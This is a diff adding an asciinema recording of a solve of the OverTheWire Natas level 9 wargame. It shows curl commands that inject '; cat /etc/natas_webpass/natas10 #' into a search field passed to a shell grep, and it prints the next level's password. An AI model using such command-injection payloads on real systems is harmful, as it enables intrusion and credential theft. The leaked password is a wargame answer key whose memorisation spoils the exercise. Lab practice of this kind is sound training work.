@@ -1,0 +1,6 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793469400,"idle_time_limit":2.0,"command":"python3 -I /home/claude/tools/ptyrun_sh.py /home/claude/solves/natas/L9.sh","title":"Natas L9 solve","env":{"SHELL":"/bin/bash"}}
+[0.008, "o", "$ curl -s -u natas9:<pw> http://natas9.natas.labs.overthewire.org/index-source.html    # passthru(\"grep -i $key dictionary.txt\")\r\r\n"]
+[1.464, "o", "passthru(\"grep&nbsp;-i&nbsp;$key&nbsp;dictionary.txt\")\r\r\n"]
+[0.001, "o", "$ curl -s -u natas9:<pw> --data-urlencode \"needle=; cat /etc/natas_webpass/natas10 #\" http://natas9.natas.labs.overthewire.org/\r\r\n"]
+[0.386, "o", "\r\r\nEgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv\r\r\n\r\r\n"]
+[0.002, "x", "0"]
